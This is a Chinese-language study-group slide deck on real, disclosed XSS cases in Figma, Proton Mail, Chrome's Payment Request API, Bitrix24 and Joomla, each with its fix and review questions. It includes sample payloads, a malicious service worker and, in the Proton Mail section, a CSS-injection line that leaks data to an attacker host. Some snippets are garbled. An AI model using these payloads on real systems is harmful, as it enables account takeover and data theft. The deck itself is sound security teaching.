---
marp: true
theme: gaia

style: |
  .blue-text { color: blue; }
  .black-text { color: black; }
  .center {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100%;
  }
paginate: true

---
<section class="center">
<h1　class="black-text">Beyond XSS：探索網頁前端資安宇宙</h1>
<h2 class="black-text">第 6 章 Case study - 有趣的攻擊案例分享</h2>

導讀人：Lulu
筆記工：Yo0
2025/02/06 @Tech-Book-Community
</section>


---

## Hello👋   I'm Lulu

- 下個月滿一年的前端工程師
- React、Next.js、Python
- 登山⛰、潛水🤿、旅遊

---

<section class="center">
<h2>前次回顧</h2>
</section>

---

## Clickjacking (點擊劫持)

- 透過 iframe 疊加，讓使用者誤點目標網站上的按鈕
- 可能導致銀行轉帳、訂閱按鈕、按讚 (Likejacking) 等誤操作
- 需要登入狀態才有攻擊效果
- 透過 JavaScript Frame Busting、X-Frame-Options、CSP frame-ancestors 防禦

---

## MIME Sniffing 攻擊

- 瀏覽器會根據內容猜測 MIME type
- 可能導致 XSS 攻擊，例如錯誤的 Content-Type 設定
- Apache 伺服器特殊行為：檔名包含 '.' 可能不設定 Content-Type
- 防禦方式：設定 X-Content-Type-Options: nosniff

---

## 前端供應鏈攻擊

- 透過污染第三方 CDN、NPM 套件影響大量網站
- cdnjs RCE 漏洞：攻擊者可取得 GitHub API Key 控制 cdnjs
- 防禦方式：
  * 使用 integrity 屬性驗證外部資源
  * 避免直接載入第三方 CDN，優先本地化資源

---

## Web3 相關攻擊

- XSS 攻擊可能影響 Web3 錢包授權 (Metamask 等)
- 供應鏈攻擊影響 Web3 應用，如 NFT、交易所
- Cookie Bomb 攻擊可影響 NFT 圖片顯示
- 防禦方式：
  * CSP 限制 script-src
  * 確保智慧合約授權安全性

---

<h2 class="black-text">6-1 差一點的 FigmaXSS</h2>

### 攻擊背景
- Figma 是設計師和工程師常用的協作工具，允許公開分享設計稿，讓使用者針對設計稿留言
- 問題出現在這個「公開的敘述欄位」，它支援部分 HTML 標籤，而 Sanitization（安全處理） 是在前端完成的！
- 有人發現，可以攔截請求並直接送未經編碼的 HTML 到後端，而後端居然沒有做任何處理，Sanitization 這段是在前端執行的：

---

``` code
// 先新建一個div
let P = document.createElement("div");

// e是我們的輸入，也就是description
// 這邊先把 e 的內容放到一個 div 中
p.innerHTML = e;

// 先用css選出所有不在名單中的元素
let f = IFs.map(y=>`:not(${y})`).join("")
,g = p.querySelectorAll(f)；

// 把每一個不在名單中的元素移除掉
for (let y of g)
    (h = y.parentNode) == null 11 h.removeChild(y);
    
// 最後呼叫 DOMPurify 來做 sanitization
r. current. innerHTML = HAm. def ault. sanitize(p. innerHTML)

```

---
Figma 先用 CSS 過濾，再用 DOMPurify 做第二層清理，乍看之下非常安全，因為允許的標籤僅限 20 種。

``` code
[fa', 'span', 'sub', 'sup', 'p', 'b', 'i\ 'pre', 'code1, 'em1, 'strike', 'strong', 'hl', 'h2', 'h3', 'ul', '。1', *li', 'hr', 'br']
```

整段程式碼其實看起來完全沒問題，先把危險的元素移除掉，最後才放到畫面上，感覺很安全啊！

---

## 突破點：innerHTML 的隱藏機制

``` code
let div = document.createElement('div');
div.innerHTML = '<img src=x onerror=alert(1)>';
```

按照一般邏輯來看，這應該不會觸發 alert(1)，因為我們 沒有把這個 div 插入到畫面上。但實際上，它還是會跳出 alert！🔥

即使 div 沒有插入到 document，瀏覽器仍然會嘗試載入圖片，並執行 onerror 事件處理程序！也就是說，只要有一瞬間，攻擊者的輸入被放進 innerHTML，XSS 就可以被觸發！

這就解釋了為什麼即使 Figma 之後使用 DOMPurify 清理輸入，XSS 仍然可能發生，因為 漏洞在最一開始的 innerHTML 賦值時就出現了。

---

## 最後的防線：CSP 擋住攻擊

Figma 的 CSP（內容安全政策）救了它：

``` code
script-src 'unsafe-eval' 'nonce-PVEIuETDG3R+8hIA6PqgIQ==' 'strict-dynamic';
```

沒有 unsafe-inline，所以即使成功觸發 onerror，XSS 還是無法真正執行惡意腳本

回報這個「差點成功的 XSS」，獲得了 $1000 USD 的漏洞獎金 🎉

---

## 6-1 總結

1️⃣ Sanitization 不能只做在前端，後端也要防禦！
2️⃣ innerHTML 操作時，即使沒插入 DOM，也可能導致 XSS！
3️⃣ CSP 仍然是非常有效的 XSS 防禦機制！

---

## 6-1 章節回顧

QA1️⃣: 在 Figma 的 XSS 漏洞中，為何即使開發人員沒有將惡意內容插入 document，仍然會觸發 onerror 事件？

QA2️⃣: Figma 在這次 XSS 測試中為何沒有真正被攻破，僅獲得「差一點成功的 XSS」回報？

---

<h2 class="black-text">6-2 繞過層層防禦：Proton Mail XSS</h2>

- XSS 連鎖攻擊案例
- Proton Mail，標榜隱私與安全的電子郵件服務
- 超複雜的 XSS 漏洞，串連了多個安全機制的繞過技術
- 最終成功讀取受害者所有郵件

---

## 漏洞的起點：HTML 信件 Sanitization

- 電子郵件的內容其實是 HTML，渲染前一定要 Sanitization（安全處理）
- 否則攻擊者只要寄一封 `<img src=x onerror=alert(1)>` 的信件，就能 XSS

---

- Proton Mail 使用 DOMPurify 過濾 HTML，還額外加了一層防禦，將所有的 `<svg>` 標籤替換為 `proton-svg`

``` code
const LIST_PROTON_TAG = ['svg'];

const sanitizeElements = (document: Element) => {
    LIST_PROTON_TAG.forEach((tagName) => {
        const svgs = document.querySelectorAll(tagName);
        svgs.forEach((element) => {
            const newElement = element.ownerDocument.createElement(`proton-${tagName}`);
            element.parentElement?.replaceChild(newElement, element);
        });
    });
}
```

- 有危險標籤都已經被過濾了
  
---

## SVG 解析的特殊行為

不同於 HTML，SVG 解析方式不同，導致兩段程式碼解析結果完全不同

- 在 `<div>` 中：

    ``` code
    <div>
        <style>
            <a id="a"></a>
        </style>
    </div>
    ```

    瀏覽器解析：`<a>` 會被當成普通文字，因為 `<style>` 內的內容預設是文字，而不是標籤。

---

- 在 `<svg>` 中：

    ``` code
    <svg>
        <style>
            <a id="a"></a>
        </style>
    </svg>
    ```

    瀏覽器解析：`<a>` 會變成一個標籤！

---

- 這有什麼影響？
  這代表我們可以利用 `<style>` 內的屬性來，逃逸出原本的 `HTML` 限制

    ``` code
    <svg>
        <style>
            <a id="</style><img src=x onerror=alert(1)>"></a>
        </style>
    </svg>
    ```

    原本應該被當成 ID 屬性的內容，卻變成了一個 `<img>` 標籤，成功 XSS！ 🚀

---

## 防禦第二層：Iframe Sandbox

插入 HTML 還不能馬上 XSS，因為 Proton Mail 把信件內容放在 iframe 內，並加上 sandbox 限制：

- allow-same-origin ➜ 允許 iframe 內的內容視為同源。
- allow-popups ➜ 允許開新視窗。
- allow-popups-to-escape-sandbox ➜ 新開的視窗可以跳出 sandbox！

禁止 script 執行，但讓受害者點擊 `<a>`，新開的視窗就不受 sandbox 限制了，成功執行 JavaScript！🚀

---

## 防禦第三層：CSP（內容安全政策）

Proton Mail 有 CSP 限制 JavaScript 來源，規則：`script-src blob:`

只能從 Blob URL 載入 JavaScript，無法載入外部 script（如 https://evil.com/xss.js）

Proton Mail 將郵件附件轉成 Blob，本來是為了顯示圖片附件，但沒有檢查 Content-Type，所以我們可以：
1️⃣ 上傳一個 JavaScript 檔案作為附件
2️⃣ 利用郵件系統將它轉成 Blob URL
3️⃣ 在 XSS 漏洞中載入這個 Blob URL 作為 `<script>`
4️⃣ 成功繞過 CSP 限制  🚀

---

## 防禦第四層：如何偷到 blob: URL？

Proton Mail 轉換的 blob: URL 是隨機的，例如：`blob:https://mail.proton.me/8b723997-737a-4cec-96db-b59c40fbdbca`

攻擊者 不知道 UUID，怎麼辦？ 
解法：CSS Injection + Image Request Leaks

`img[src*="abc"] { background: url("https://attacker.com/leak?abc"); }
`
1️⃣ 攻擊者在信件中注入 CSS Injection
2️⃣ 當 Proton Mail 渲染信件時，逐步洩漏 blob: URL
3️⃣ 最終拼湊出完整的 blob: URL，成功載入惡意 JavaScript！

---

## 最終攻擊流程

1️⃣ 寄第一封信
- 夾帶 JavaScript 作為附件
- 內含 CSS Injection，利用圖片載入外發請求來洩漏 Blob URL
  

2️⃣ 攻擊者取得完整 Blob URL


3️⃣ 寄第二封信
- 直接放入 `<script src="blob URL">`
- 受害者 打開信件即執行惡意 JavaScript，XSS 達成！🚀
  
---
## 影響範圍

攻擊者可以讀取受害者所有郵件，甚至執行更多操作，因為 XSS 發生在 Proton Mail 本身，所有權限都是合法的！

這個攻擊結合了：
✅ Sanitization Bypass（SVG 解析異常）
✅ Sandbox Bypass（新開視窗逃逸）
✅ CSP Bypass（Blob URL 內容檢查疏漏）
✅ CSS Injection（洩漏 Blob URL）

---

## Proton Mail 如何修復？

✅ 修正 SVG 解析方式，避免 <style> 被錯誤解析
✅ 移除 allow-popups-to-escape-sandbox，防止 sandbox 逃逸
✅ 檢查附件的 content-type，防止執行 JavaScript
✅ 加強 CSP 限制，阻擋 blob: 作為 script 來源

---

## 6-2 章節回顧

QA1️⃣: Proton Mail 的 XSS 漏洞是如何成功繞過原本的 DOMPurify sanitization？

QA2️⃣: 在 Proton Mail 的攻擊鏈中，結合那些攻擊？

---

<h2 class="black-text">6-3 Payment Request API 的隱藏漏洞：Chrome XSS</h2>

- 藏在 Chrome 金流功能內的 XSS 漏洞，編號 CVE-2023-5480
- 發現者因此獲得 16,000 美金（約台幣 50 萬）的漏洞賞金 💰
- 發生在 Payment Request API
- 簡化支付流程，結果卻被發現可以用來繞過限制、執行 XSS 攻擊！

---

## Payment Request API 是什麼？

- 讓使用者付款，開發者必須串接各種金流 API，例如 PayPal、Stripe、綠界、街口支付 等，每家 API 的串法都不同，導致開發過程相當繁瑣
- Payment Request API 的目標就是統一這些流程，開發者只需要：
  - 1️⃣ 填入商品資訊與金流服務的 URL
  - 2️⃣ 瀏覽器自動開啟支付視窗

---

``` code
async function pay() {
    if (!window.PaymentRequest) {
        alert('瀏覽器不支援');
        return;
    }
    const supportedInstruments = [{ supportedMethods: 'https://bobbucks.dev/pay' }];
    const details = {
        displayItems: [{ label: '商品1', amount: { currency: 'TWD', value: '200' } }],
        total: { label: '合計', amount: { currency: 'TWD', value: '200' } }
    };
    const request = new PaymentRequest(supportedInstruments, details);
    try {
        const paymentResponse = await request.show();
        await paymentResponse.complete('success');
        alert('支付成功');
    } catch (err) {
        alert('支付失敗');
        console.error(err);
    }
}
```

按支付按鈕彈出支付視窗，不需串接 API，問題就出在支付流程的底層

---

## 漏洞解析

- 瀏覽器收到 Payment Request API 的請求時，會去解析 金流服務的 URL，並且搜尋 manifest 檔案，這個過程包含以下步驟：
  - 1️⃣ 讀取 Link header，獲取 payment-manifest.json
  - 2️⃣ 讀取 app_manifest.json，找到 service worker
  - 3️⃣ 透過 service worker 控制付款流程

---

- payment-manifest.json（示意內容）
    ``` code
    {
    "default_applications": ["https://bobbucks.dev/pay/manifest.json"],
    "supported_origins": ["https://bobbucks.dev"]
    }
    ```

- app_manifest.json（示意內容）
  ``` code
  {
  "name": "Pay with BobBucks",
  "serviceworker": { "src": "sw-bobbucks.js", "use_cache": false }
  }
  ```

- 這個機制確保第三方支付頁面能夠被瀏覽器正確識別，但如果攻擊者可以控制這些 JSON 檔案，就能偷偷註冊惡意的 service worker！

---

## 如何利用這個漏洞？

- 某些網站允許上傳檔案，提供下載連結，但下載時會有Content-Disposition: attachment，避免檔案被當成 HTML 載入，因此即使網站允許上傳 HTML，也不會有 XSS 問題。
- 但是！Chrome 允許 從 response 直接讀取 manifest，這意味著如果攻擊者可以在第三方網站上上傳 JSON 檔案，並讓 Chrome 誤以為這些是金流 API 的設定檔，那麼就可以 偷偷讓受害者的瀏覽器載入惡意的 service worker！

---

### 攻擊步驟

1️⃣ 攻擊者上傳三個 JSON 檔案與 service worker 到開放上傳的網站
 (files.example.com)：manifest.json / app_manifest.json / sw.js（惡意 Service Worker）

2️⃣ 在惡意網站上 發送 Payment Request API 請求，指向 <https://files.example.com/huli123/manifest.json>

3️⃣ 瀏覽器誤以為這是一個正常的支付請求，開始載入這些檔案

4️⃣ 瀏覽器安裝攻擊者的 惡意 Service Worker，攻擊者即可攔截請求，並回傳 任意 JavaScript，觸發 XSS

---

### 惡意 Service Worker 範例

``` code
self.addEventListener("fetch", (event) => {
    const blob = new Blob(["<script>alert('XSS')</script>"], { type: "text/html" });
    event.respondWith(new Response(blob));
});
```

這樣就成功繞過 原本的下載限制，直接讓 files.example.com 變成 XSS 漏洞點！

---

## Google 如何修復？

取消「從 response 直接讀取 manifest」的功能，要求必須透過 HTTP Header 傳遞 manifest URL，這樣攻擊者就無法單純透過上傳檔案來影響 Payment Request API。

這個漏洞被評為 高風險（CVE-2023-5480），發現者 Slonser 獲得 16,000 美金賞金（約台幣 50 萬）💰

---

## 結論

- Payment Request API 雖然方便，但如果處理不當，就會帶來安全風險，攻擊者可以 透過 JSON 檔案控制流程，讓受害者瀏覽器安裝惡意 Service Worker，最終觸發 XSS！

✅ 瀏覽器應該限制 Service Worker 的來源，避免任意網站被利用
✅ 開放檔案上傳的網站應該防範 JSON、HTML 這類檔案被濫用
✅ Content-Disposition: attachment 雖然能防止 HTML XSS，但不代表完全安全！

---

## 6-3 節回顧

QA1️⃣: 為什麼 Chrome 的 Payment Request API 會導致 XSS 漏洞？

QA2️⃣: 攻擊者如何利用 Payment Request API 來執行 XSS？

---

<h2 class="black-text">6-4 Prototype Pollution 變 XSS：Bitrix24 漏洞分析</h2>

- 發生在 Bitrix24，這是一款提供 CRM、專案管理、團隊協作 等功能的 SaaS 服務
- 新加坡的 STAR Labs 在 2023 年發現 Prototype Pollution 變成 XSS 的漏洞，最終甚至能執行 PHP 命令
- Bitrix24 解析 Query String 的函式，導致攻擊者可以污染 Object.prototype，並利用 JavaScript 原型鍊 的特性來構造 XSS 攻擊

---

## Prototype Pollution 是什麼？

- Prototype Pollution（原型污染）是一種 JavaScript 物件污染攻擊，原理是 攻擊者可以修改 Object.prototype，影響所有物件的屬性

```code
Object.prototype.isAdmin = true;
console.log({}.isAdmin); // true
```

- 某個網站的程式碼 允許攻擊者透過 Query String 或 JSON 設定 Object 的 prototype，就可能觸發 Prototype Pollution，進一步導致 XSS 或更嚴重的漏洞

---

## 漏洞解析

- Bitrix24 有一個用來 解析 URL Query String 的函式 parseQuery，其運作方式如下：

---

```code
function parseQuery(input) {
    if (!Type.isString(input)) { return {};}

    const url = input.trim().replace(/^[?#&]/, '');

    if (!url) { return {};}

    return url.split('&').reduce((acc, param) => {
        const [key, value] = param.replace(/\+/g, ' ').split('=');
        const keyFormat = getKeyFormat(key);
        const formatter = getParser(keyFormat);
        formatter(key, value, acc);
        return acc;
    }, {});
}
```

這段程式碼會解析 Query String，例如：?a[b]=1 → { a: { b: 1 } }

---

## 問題出在哪裡？

- 它會根據 key 的格式 來決定如何解析，例如：

``` code
function getKeyFormat(key) {
    if (/^\w+\[\[\w+\]\]$/.test(key)) {
        return 'index';
    }

    if (/^\w+\[\]$/.test(key)) {
        return 'bracket';
    }

    return 'default';
}
```

---

- 這代表：
  - a[b] 會解析成 { a: { b: value } }
  - a[] 會解析成陣列
  - 其他的則是一般的 key-value

- 但攻擊者可以輸入 __proto__[test]=1，這樣會發生什麼事？

``` code
Object.prototype.test = 1;
```

- 這就是 Prototype Pollution，因為 Object.prototype 被污染了，所有物件都會被影響！😱

---

## 如何從 Prototype Pollution 變成 XSS？

程式碼中是否有地方可以利用這個污染的 Object.prototype。
在 Bitrix24 中，當頁面載入時，會呼叫 BX.render() 來建立 HTML 元素：

---

``` code
BX.render = function(item) {
    var element = null;
    if (isBlock(item) || isTag(item))
    {
        var tag = 'tag' in item ? item.tag : 'div';
        var className = item.block;
        var attrs = 'attrs' in item ? item.attrs : {};
        var events = 'events' in item ? item.events : {};
        var props = {};
        // 建立 HTML 元素
        element = BX.create(tag, {props: props, attrs: attrs, events: events, 
            children: children, html: text});
    }
    return element;
};
```

1️⃣ 如果 item.tag 沒有被定義，預設為 div  
2️⃣ 可污染 Object.prototype.tag，可變成其他 HTML 標籤 script！

---

## 透過 XSS 執行 JavaScript

過 Prototype Pollution，攻擊者可以：

``` code
Object.prototype.tag = "script";
Object.prototype.text = "alert('XSS')";
```

結果 BX.render() 會動態建立  `<script>alert('XSS')</script>` ，直接執行 JavaScript！ 🎉

---

## XSS + Admin 權限 = 直接執行 PHP

如果XSS 攻擊到 Admin 帳號，Bitrix24 內建一個 admin API php-command-line.php，允許管理員執行 PHP 指令！

攻擊流程:
1️⃣ 透過 Prototype Pollution 觸發 XSS
2️⃣ 讓 Admin 執行惡意 JavaScript
3️⃣ 呼叫 php-command-line.php API，直接執行任意 PHP
4️⃣ 伺服器被完全控制！ 💀

---

## Bitrix24 如何修復？

✅ 禁止 Object.prototype 被修改
✅ 限制 Query String 只能解析特定 key
✅ 加強 BX.render()，避免 tag 屬性被污染

這樣就能防止 Prototype Pollution 變成 XSS！

---

## 6-4總結

案例展示Prototype Pollution 如何變成 XSS，甚至導致伺服器被入侵，漏洞鏈串起來真的很可怕！😱

✅ 永遠不要信任使用者輸入的 Query String！
✅ Object.prototype 絕對不能被污染，應該在程式碼中明確禁止！
✅ 前端框架應該避免使用 Object.prototype 來判斷屬性，防止類似攻擊！

---

## 6-4 章節回顧

QA1️⃣: Bitrix24 的 XSS 漏洞是怎麼產生的？

QA2️⃣: 在 Bitrix24 XSS 漏洞中，攻擊者如何進一步擴大影響？

---

<h2 class="black-text">6-5  Joomla! 也中招！PHP 底層 Bug 變 XSS</h2>

- Joomla 一個 開源 CMS（內容管理系統）
- 類似 WordPress，允許使用者透過後台管理網站、發表文章、安裝外掛，甚至建置 電商網站、公司形象網站
- 問題並不是 Joomla 的程式碼有錯，而是 PHP 底層函式的 bug 造成的！ 
- Joomla! 清理 HTML 標籤的函式 cleanTags()，理論上這個函式應該要刪除使用者輸入的 HTML 標籤，以防止 XSS，但因為 PHP 底層的 bug，卻讓攻擊者可以繞過這個防禦！

---

## cleanTags() 是如何移除標籤的？

-　負責 清除使用者輸入中的 HTML 標籤，大致上運作方式如下:

```code
hello<h1>title</h1>123
```

1️⃣ 取得 < 前面的文字（hello）
2️⃣ 取得 > 後面的文字（title123）
3️⃣ 把它們合併成 hellotitle123，成功去除標籤 ✅

---

簡單版的 PHP 實作

```code
$input = "hello<h1>";
$end = mb_strpos($input, '<'); // 找到 `<` 的位置
$output = mb_substr($input, 0, $end); // 取 `<` 前的文字
echo $output; // hello
```

看起來沒有問題，但關鍵的問題出在 mb_strpos() 和 mb_substr() 處理「不合法的 UTF-8 字串」時的行為不一致！ ⚠

---

## PHP 的 Bug 怎麼影響 Joomla!?

處理多字節字串（像是中文、日文）時，會使用 mb_ 系列函式，因為像 substr() 這種函式是以 byte 為單位，可能會截斷 UTF-8 字元，導致亂碼問題。

📌為什麼要用 mb_strpos() 而不是 strpos()？

```code
$input = "你好";
echo mb_substr($input, 0, 1); // 你
echo substr($input, 0, 1); // 亂碼（因為「你」這個字是 3 個 bytes）
```

mb_ 函式是為了正確處理 Unicode 字串，但這次漏洞發生在 PHP 的 mb_strpos() 和 mb_substr() 處理「不合法 UTF-8 字串」的方式不同！

---

## Bug：不合法 UTF-8 字串解析不一致

- UTF-8 字元的編碼長度是不固定的（1~4 bytes），PHP 會根據第一個 byte 來判斷字元長度，例如：
  - 1110xxxx 開頭 = 3 bytes
  - 110xxxxx 開頭 = 2 bytes
  - 0xxxxxxx 開頭 = 1 byte

---

- 如果字元編碼不合法，不同的函式會有不同的處理方式
```code
$input = "\xE4\xBD\x61\x62\x63\x64<"; // UTF-8 編碼錯誤的字串
$pos = mb_strpos($input, '<'); 
$sub = mb_substr($input, 0, $pos);
echo $sub;
```

- 發生什麼事？
  - mb_strpos() 會忽略錯誤的 UTF-8 字元，因此它認為 < 在 第六個字
  - 但 mb_substr() 直接把錯誤的 UTF-8 當作合法字元處理，所以 < 變成了第五個字

- 結果就是：
  - 錯誤的 mb_substr() 會取出「未經處理的 <，導致 XSS！」 😨

---

## 實際攻擊方式

攻擊者可以透過 特殊的 UTF-8 字串 讓 Joomla! 錯誤解析 HTML，導致 XSS 注入：

```code
<script>alert('XSS')</script>
```

✅ 竊取 Admin Token
✅ 竄改網站內容
✅ 執行惡意 JavaScript
✅ 甚至透過 Joomla! API 取得 伺服器控制權限！

---

## Joomla! & PHP 如何修復？

1️⃣ Joomla! 修復方式：
    改用 strpos() 和 substr()，避免 mb_ 函式的不一致性

2️⃣ PHP 修復方式：
    修正 mb_substr() 的行為，讓它與 mb_strpos() 一致，確保不會誤判字串長度

問題不在 Joomla! 本身，而是在 PHP 的底層實作，所以 PHP 官方也發布了更新修復這個問題！

---

## 6-5總結

✅ XSS 漏洞不一定來自前端，後端處理錯誤的字串也可能導致漏洞！
✅ PHP 多字節函式 (mb_strpos() vs mb_substr()) 行為不一致，會影響字串過濾機制！
✅ 程式語言對「不合法 UTF-8 字串」的處理方式，可能會帶來安全風險！

漏洞提醒：
📌 使用 mb_ 函式時要注意，它們對錯誤字串的行為可能不同！
📌 輸入驗證很重要，不要讓「不合法 UTF-8 字串」影響安全機制！

---

## 6-5 章節回顧

QA1️⃣: Joomla! 的 XSS 漏洞是如何發生的？

QA2️⃣: Joomla! 最後是如何修復這個漏洞的？

---
## 下次預告：

全書回顧討論會 - 齊畫架構圖

- 日期：2/20
- Host：Lois